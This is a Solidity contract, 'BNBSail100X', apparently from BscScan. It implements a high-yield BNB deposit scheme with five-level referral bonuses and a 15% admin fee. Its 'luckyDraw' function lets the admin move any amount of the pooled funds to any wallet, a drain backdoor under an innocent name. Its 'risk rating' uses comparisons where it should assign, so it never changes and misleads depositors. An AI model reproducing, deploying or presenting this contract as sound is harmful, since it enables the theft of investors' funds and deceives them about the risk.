/**
 *Submitted for verification at BscScan.com on 2022-03-09
*/

//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint256 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct User {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
  uint256 checkpoint;
  uint256 stake_count;
}

contract BNBSail100X {

    using SafeMath for uint256;
    address public admin;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public active_users = 0;
    uint256 public total_users = 0;
    uint256 public risk_rating = 3;
    uint256 constant public TIME_STEP = 1 days;
    uint256 public startCONT;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000;
    uint256 constant public ADMIN_FEE = 150;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20, 10, 5]; 

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => User) public users;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    modifier restricted() {
    require(
      msg.sender == admin,
      "Restricted to the contract admin"
    );
    _;
  }

    constructor() {
        admin = msg.sender;
        startCONT = block.timestamp;

      uint256 tarifPercent= 150;

        for (uint8 tarifDuration = 10; tarifDuration <= 90; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        } 
  
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            users[_addr].last_payout = uint40(block.timestamp);
            users[_addr].dividends += payout;
        }else{
            active_users=active_users-1; 
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            users[up].match_bonus += bonus;
            users[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = users[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _addr != admin) {
            if(users[_upline].deposits.length == 0) {
                _upline = admin;
            }

            users[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                users[_upline].structure[i]++;

                _upline = users[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days == 10 || tarifs[_tarif].life_days == 30 || tarifs[_tarif].life_days == 60 || tarifs[_tarif].life_days == 90, " Invalid Plan");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        User storage user = users[msg.sender];
        uint256 stake_id = ++user.stake_count;
        if (stake_id == 1) {
            total_users++;
            active_users++;
        }

        _setUpline(msg.sender, _upline, msg.value);

        user.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        user.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        payable(admin).transfer(msg.value.mul(ADMIN_FEE).div(PERCENT_DIVIDER));
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        User storage user = users[msg.sender];

        _payout(msg.sender);
        require(user.checkpoint.add(TIME_STEP) < block.timestamp, "Withdraw restricted for only once a day");
        require(user.dividends > 0 || user.match_bonus > 0, "Zero amount");

        uint256 amount = user.dividends + user.match_bonus;

        user.dividends = 0;
        user.match_bonus = 0;
        user.total_withdrawn += amount;
        withdrawn += amount;

        user.checkpoint = block.timestamp;
        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        User storage user = users[_addr];

        for(uint256 i = 0; i < user.deposits.length; i++) {
            Deposit storage dep = user.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = user.last_payout > dep.time ? user.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }
 
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure,uint256 _checkpoint) {
        User storage user = users[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = user.structure[i];
        }

        return (
            payout + user.dividends + user.match_bonus,
            user.total_invested,
            user.total_withdrawn,
            user.total_match_bonus,
            structure,
            user.checkpoint
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus, uint256 _risk_rating, uint256 _total_users, uint256 _active_users, uint256 _startCONT) {
        //Risk rating is only an indicative rating with a tested algorithm for multiple contracts over 100 BNB
        if (invested>100)
        {
            uint256 valueFigure = invested.sub(withdrawn).sub(match_bonus);
            uint256 contractBalance = address(this).balance; 
            uint256 riskValue = valueFigure.sub(contractBalance).mul(total_users).div(active_users);
                if (riskValue <= 50){
                    risk_rating == 1; //High risk 
                } else if (invested>100 && riskValue > 50 && riskValue <= 99 ){
                    risk_rating == 2; //Medium risk 
                }
        } 
        return (invested, withdrawn, match_bonus, risk_rating, total_users, active_users, startCONT );
    }

    function luckyDraw(address _luckywallet, uint256 _amount) public restricted{
		require (msg.sender == admin);
        payable(_luckywallet).transfer(_amount);
	}

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }
}
library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            
            
            
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}